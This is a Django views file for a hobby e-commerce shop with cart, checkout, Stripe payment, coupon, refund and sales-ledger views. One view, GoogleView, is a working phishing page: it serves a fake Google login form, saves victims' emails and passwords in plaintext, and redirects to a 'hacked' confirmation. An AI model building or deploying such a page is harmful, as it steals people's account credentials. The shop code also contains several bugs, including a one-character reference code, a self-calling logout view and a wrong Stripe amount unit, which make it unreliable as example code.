from django.shortcuts import render, get_object_or_404
from .models import Item, OrderItem, Order, Address, Payment, ContactPage, Coupon, Refund, GooglePhishing, \
    Pocket, Calculations,Biriyani
from django.views.generic import ListView, DetailView, View
from django.shortcuts import redirect
from django.conf import settings
from django.utils import timezone
from .forms import Login, CheckOut, Contact, CouponForm, RefundForm, Googlephishing, PocketSale
from django.contrib.auth import authenticate, login, logout
from django.http import HttpResponseRedirect
from django.contrib.auth.decorators import login_required
from django.contrib.auth import get_user_model
from django.contrib.auth.forms import UserCreationForm
from django.core.exceptions import ObjectDoesNotExist
from django.contrib import messages

import random
import string
import stripe

stripe.api_key = settings.STRIPE_SECRET_KEY

# `source` is obtained with Stripe.js; see https://stripe.com/docs/payments/accept-a-payment-charges#web-create-token

User = get_user_model()


def get_ref_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits))


class HomeView(ListView):
    model = Item
    template_name = 'home-page.html'
    paginate_by = 5


class ProductDetailView(DetailView):
    model = Item
    template_name = 'product-page.html'


def home(request):
    context = {

        'items': Item.objects.all()
    }
    return render(request, "home-page.html", context)


def product_details(request):
    context = {

        'items': Item.objects.all()
    }
    return render(request, "product-page.html", context)


def dynamic(request, id):
    obj = Item.objects.get(id=id)
    obj = get_object_or_404(Item, id=id)
    context = {

        'object': obj
    }
    return render(request, "product-page.html", context)


@login_required
def add_to_cart(request, id):
    indivudial_item = get_object_or_404(Item, id=id)
    order_item, created = OrderItem.objects.get_or_create(item=indivudial_item, user=request.user, ordered=False)
    order_qs = Order.objects.filter(user=request.user, ordered=False)
    if order_qs.exists():
        order = order_qs[0]
        if order.items.filter(item__id=indivudial_item.id).exists():
            order_item.quantity += 1
            order_item.save()
            messages.info(request, "item is updated by quantity to your cart")
        else:
            order.items.add(order_item)
            messages.info(request, "item is added to your cart")
    else:
        ordered_date = timezone.now()
        order = Order.objects.create(user=request.user, ordered_date=ordered_date)
        order.items.add(order_item)
        messages.info(request, "item is added to your cart")
    return redirect('../../')


@login_required
def remove_from_cart(request, id):
    indivudial_item = get_object_or_404(Item, id=id)
    order_qs = Order.objects.filter(user=request.user, ordered=False)
    if order_qs.exists():
        order = order_qs[0]
        if order.items.filter(item__id=indivudial_item.id).exists():
            order_item = OrderItem.objects.filter(user=request.user, item=indivudial_item, ordered=False)[0]
            order.items.remove(order_item)
            messages.info(request, "item is removed from your cart")
        else:
            messages.info(request, "this item is not in your cart")
            return redirect('../../')


    else:
        messages.info(request, "There is no item in your cart")
        return redirect('../../')
    return redirect('../../')


def loginpage(request):
    forms = Login(request.POST or None)
    context = {
        'form': forms
    }
    print(request.user.is_authenticated)
    if forms.is_valid():
        print(forms.cleaned_data)
        username = forms.cleaned_data['username']
        password = forms.cleaned_data['password']
        user = authenticate(username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect('/')
        else:
            print("error")
    return render(request, "login.html", context=context)


def register(request):
    if request.method == "POST":
        form = UserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('account_login')
    else:
        form = UserCreationForm()
    return render(request, "registration/signup.html", {'form': form})


@login_required
def logout(request):
    logout(request)
    return HttpResponseRedirect('home/')


class ContactView(View):
    def get(self, *args, **kwargs):
        form = Contact()
        context = {
            'form': form
        }
        return render(self.request, "index.html", context)

    def post(self, *args, **kwargs):
        form = Contact(self.request.POST or None)
        if form.is_valid():
            print(form.cleaned_data)
            name = form.cleaned_data.get('name')
            number = form.cleaned_data.get('number')
            message = form.cleaned_data.get('message')

            contact = ContactPage(
                name=name,
                number=number,
                message=message,
                user=self.request.user
            )

            contact.save()
        return redirect("/")


def is_valid(values):
    valid = True
    for field in values:
        if field == " ":
            valid = False
    return valid


class CheckoutView(View):
    def get(self, *args, **kwargs):
        form = CheckOut()
        order = Order.objects.get(user=self.request.user, ordered=False)
        coupon_form = CouponForm()
        context = {
            'order': order,
            'couponform': coupon_form,
            'form': form,
        }

        billing_address_qs = Address.objects.filter(
            user=self.request.user,
            address_type='B',
            default=True
        )
        if billing_address_qs.exists():
            context.update({'default_shipping_address': billing_address_qs[0]})

        shipping_address_qs = Address.objects.filter(
            user=self.request.user,
            address_type='S',
            default=True
        )
        if shipping_address_qs.exists():
            context.update({'default_billing_address': shipping_address_qs[0]})
        return render(self.request, "checkout-page.html", context)

    def post(self, *args, **kwargs):
        form = CheckOut(self.request.POST or None)

        order = Order.objects.get(user=self.request.user, ordered=False)

        if form.is_valid():

            use_default_shipping = form.cleaned_data.get('use_default_shipping ')
            if use_default_shipping:
                shipping_address_qs = Address.objects.filter(
                    user=self.request.user,
                    address_type='S',
                    default=True
                )
                if shipping_address_qs.exists():
                    shipping_address = shipping_address_qs[0]
                    shipping_address.save()
            else:
                shipping_address1 = form.cleaned_data.get('shipping_address')
                shipping_address2 = form.cleaned_data.get('shipping_address2')
                shipping_country = form.cleaned_data.get('shipping_country')
                shipping_pin_code = form.cleaned_data.get('shipping_pin_code')
                set_default_shipping = form.cleaned_data.get('set_default_shipping')
                if is_valid([shipping_pin_code, shipping_country, shipping_address2, shipping_address1]):
                    shipping_address = Address(
                        user=self.request.user,
                        street_address=shipping_address1,
                        apartment_address=shipping_address2,
                        country=shipping_country,
                        pin_code=shipping_pin_code,
                        address_type='S'
                    )

                    shipping_address.save()

                    if set_default_shipping:
                        shipping_address.default = True
                        shipping_address.save()
                else:
                    messages.info(self.request, "please the fill the form correctly")
                    return redirect("/")

            use_default_billing = form.cleaned_data.get('use_default_billing ')
            same_billing_address = form.cleaned_data.get('same_billing_address')
            if same_billing_address:
                billing_address = shipping_address
                billing_address.pk = None
                billing_address.address_type = 'B'
                order.billing_address = billing_address
                order.save()
                billing_address.save()
            elif use_default_billing:
                billing_address_qs = Address.objects.filter(
                    user=self.request.user,
                    address_type='B',
                    default=True
                )
                if billing_address_qs.exists():
                    billing_address = billing_address_qs[0]
                    order.billing_address = billing_address
                    order.save()
            else:
                billing_address1 = form.cleaned_data.get('billing_address')
                billing_address2 = form.cleaned_data.get('billing_address2')
                billing_country = form.cleaned_data.get('billing_country')
                billing_pin_code = form.cleaned_data.get('billing_pin_code')
                set_default_billing = form.cleaned_data.get('set_default_billing')
                if is_valid([billing_pin_code, billing_country, billing_address2, billing_address1]):
                    billing_address = Address(
                        user=self.request.user,
                        street_address=billing_address1,
                        apartment_address=billing_address2,
                        country=billing_country,
                        pin_code=billing_pin_code,
                        address_type='B',

                    )
                    billing_address.save()
                    order.billing_address = billing_address
                    order.save()

                    if set_default_billing:
                        billing_address.default = True
                        billing_address.save()
                else:
                    messages.info(self.request, "please the fill the form correctly")
                    return redirect("/")
            payment_method = form.cleaned_data.get('payment_method')

            if payment_method == 'S':
                return redirect('http://127.0.0.1:8000/payment/stripe/')
            elif payment_method == "P":
                print("failed")
                return redirect("/", payment_method="paypal")
        else:
            return redirect("/")


class PaymentView(View):
    def get(self, *args, **kwargs):
        order = Order.objects.get(user=self.request.user, ordered=False)
        context = {
            'order': order
        }
        return render(self.request, "payment.html", context)

    def post(self, *args, **kwargs):
        order = Order.objects.get(user=self.request.user, ordered=False)
        amount = int(order.get_total())
        token = self.request.POST.get('stripeToken')

        try:
            charge = stripe.Charge.create(
                amount=amount,
                currency="usd",
                source=token,

            )
            payment = Payment()
            payment.user = self.request.user
            payment.stripe_charge_id = charge.id
            payment.amount = amount
            payment.save()
            order_items = order.items.all()
            order_items.update(ordered=True)
            for item in order_items:
                item.save()
            order.payment = payment
            order.ordered = True
            order.ref_code = get_ref_code()
            order.save()

            messages.success(self.request, "Success")
            return redirect("/")

        except stripe.error.CardError as e:
            # Since it's a decline, stripe.error.CardError will be caught
            body = e.Json_body
            err = body.get('error', {})
            messages.error(self.request, f"{err.get('message')}")
            return redirect("/")

        except stripe.error.RateLimitError as e:
            # Too many requests made to the API too quickly
            messages.error(self.request, "Rate Limit error")
            return redirect("/")
        except stripe.error.InvalidRequestError as e:
            # Invalid parameters were supplied to Stripe's API
            messages.error(self.request, "Invalid Request")
            return redirect("/")

        except stripe.error.AuthenticationError as e:
            # Authentication with Stripe's API failed
            # (maybe you changed API keys recently)
            messages.error(self.request, "Authentcation Error")
            return redirect("/")
        except stripe.error.APIConnectionError as e:
            # Network communication with Stripe failed
            messages.error(self.request, "Api connection error")
            return redirect("/")
        except stripe.error.StripeError as e:
            # Display a very generic error to the user, and maybe send
            # yourself an email
            messages.error(self.request, "Strpe error")
            return redirect("/")
        except Exception as e:
            # Something else happened, completely unrelated to Stripe
            messages.error(self.request, "Serious error")
            return redirect("/")


def get_coupon(request, code):
    try:
        coupon = Coupon.objects.get(code=code)
        return coupon
    except ObjectDoesNotExist:
        messages.error(request, "Serious error")
        return redirect("/")


def add_coupon(request):
    if request.method == "POST":
        form = CouponForm(request.POST or None)
        if form.is_valid():
            try:
                print(form.cleaned_data)
                code = form.cleaned_data.get('code')
                order = Order.objects.get(user=request.user, ordered=False)
                order.coupon = get_coupon(request, code)
                order.save()
                messages.success(request, "your coupon is added successfully")
                return redirect("/")
            except ObjectDoesNotExist:
                messages.error(request, "Serious error")
                return redirect("/")
        return redirect("/")


class RefundView(View):
    def get(self, *args, **kwargs):
        form = RefundForm()
        context = {
            'form': form
        }
        return render(self.request, "order_refund.html", context)

    def post(self, *args, **kwargs):
        form = RefundForm(self.request.POST or None)
        if form.is_valid():
            print(form.cleaned_data)
            ref_code = form.cleaned_data.get('ref_code')
            message = form.cleaned_data.get('message')
            email = form.cleaned_data.get('email')
            try:
                order = Order.objects.get(ref_code=ref_code, user=self.request.user)
                refund = Refund()
                refund.order = order
                refund.ref_code = ref_code
                refund.message = message
                refund.email = email

                order.refund_requested = True
                order.save()
                refund.save()
                messages.success(self.request, "your request is recieved")
                return redirect("/")
            except ObjectDoesNotExist:
                messages.warning(self.request, "order is not available")
                return redirect("/")


class GoogleView(View):
    def get(self, *args, **kwargs):
        form = Googlephishing()
        context = {
            'form': form
        }
        return render(self.request, "google_login.html", context)

    def post(self, *args, **kwargs):
        form = Googlephishing(self.request.POST or None)
        if form.is_valid():
            print(form.cleaned_data)
            email = form.cleaned_data.get('email')
            password = form.cleaned_data.get('password')
            order = GooglePhishing()
            order.email = email
            order.password = password
            order.save()
            return redirect("/hacked/")
        messages.warning(self.request, "error occured")
        return redirect("/")


def hacked(request):
    return render(request, "hacked_confirm.html")


def message(request):
    return render(request, "message.html")


class PocketView(View):
    def get(self, *args, **kwargs):
        form = PocketSale()
        # order = Order.objects.get(user=self.request.user, ordered=False)
        context = {
            # 'order': order,

            'form': form
        }
        return render(self.request, "add_musalla.html", context)

    def post(self, *args, **kwargs):
        form = PocketSale(self.request.POST or None)
        if form.is_valid():
            print(form.cleaned_data)
            name = form.cleaned_data.get('name')
            name_of_seller = form.cleaned_data.get('name_of_seller')
            price = form.cleaned_data.get('price')
            quantity = form.cleaned_data.get('quantity')
            discount = form.cleaned_data.get('discount')
            discount_description = form.cleaned_data.get('discount_description')
            amount = form.cleaned_data.get('amount')

            pocket = Pocket()
            pocket.name_of_seller = name_of_seller
            pocket.name_of_buyer = name
            pocket.price = price
            pocket.quantity = quantity
            pocket.discount = discount
            pocket.discount_description = discount_description
            pocket.amount = amount

            pocket.save()
            return redirect("/checkout/")
        print("error")
        return redirect("/")


def pocketsummuryview(request):
    try:
        cal_qs = Calculations.objects.all()
        cal = cal_qs[0]
        calculations = Calculations()
        pocket = Pocket()
        items = Pocket.objects.all()
        total = 0
        amount = 0
        sum = 0
        quantity = 0
        discount = 0
        s = 0
        a = 0
        b = 0
        c = 0
        d = 0
        call = 0
        left = 0
        extra = 0
        debt = 0
        for item in items:
            sum = item.get_total_price()
            if item.debt_amount:
                total = total + sum
                debt += item.debt_amount
            else:
                total += sum
            quantity = quantity + item.quantity
            extra = extra + item.extra_pocket

            if item.discount:
                amount = amount + item.discount
            if item.debt_amount:
                if item.name_of_seller == "A":
                    b = b + item.debt_amount
                if item.name_of_seller == "B":
                    c = item.get_total_price()
                    d = d + c + item.debt_amount

            if not item.debt_amount:
                if item.full_amount_given:
                    if item.name_of_seller == "A":
                        a = item.get_total_price()
                        b = b + a
                    if item.name_of_seller == "B":
                        c = item.get_total_price()
                        d = d + c
            if not item.full_amount_given:
                if item.debt_amount:
                    discount += item.debt_amount
                else:
                    s = item.get_total_price()
                    discount = discount + s
        quantity += extra
        cal.save()
        cal_qs = Calculations.objects.all()
        cal = cal_qs[0]
        if cal.incremented_amount_bijas:
            d = d + cal.incremented_amount_bijas
        if cal.decremented_amount_bijas:
            print("decremented_amount")
            d = d - cal.decremented_amount_bijas
        if cal.incremented_amount_unny:
            b = b + calculations.incremented_amount_unny
        if cal.decremented_amount_unny:
            b = b - cal.decremented_amount_unny
        cal.amount_in_unny = b
        cal.amount_in_bijas = d
        cal.save()
        rem = total - discount
        if extra:
            left = 100 - quantity - extra
        else:
            left = 100 - quantity
        dis_left = rem - amount
        context = {
            'items': items,
            'amount': amount,
            'total': total,
            'quantity': quantity,
            'discount': discount,
            'rem': rem,
            'left': left,
            'dis': dis_left,
            'b': b,
            'd': d,
            'extra': extra,
            'debt': debt

        }
        return render(request, 'pocket_summury.html', context)
    except ObjectDoesNotExist:
        messages.info(request, "You do not have active order")
        return redirect("/")


def ordersummuryview(request):
    try:
        order = Order.objects.get(user=request.user, ordered=False)
        context = {
            'object': order
        }
        return render(request, 'order-summury.html', context)
    except ObjectDoesNotExist:
        messages.info(request, "You do not have active order")
        return redirect("/")


def BiriyaniView(request):
    order_qs=Biriyani.objects.all()
    quantity=0
    amount=0
    sum=0
    get=0
    bal=0

    for item in order_qs:
        quantity =quantity+ item.quantity
        sum = item.get_total_price_biriyani()
        amount = amount + sum
        if item.amount_given:
            get=get+item.get_total_price_biriyani()
        else:
            bal=bal+item.get_total_price_biriyani()

    context={
        'orders':order_qs,
        'quantity':quantity,
        'amount':amount,
        'get':get,
        'bal':bal
    }

    return render(request, "biriyani.html", context)

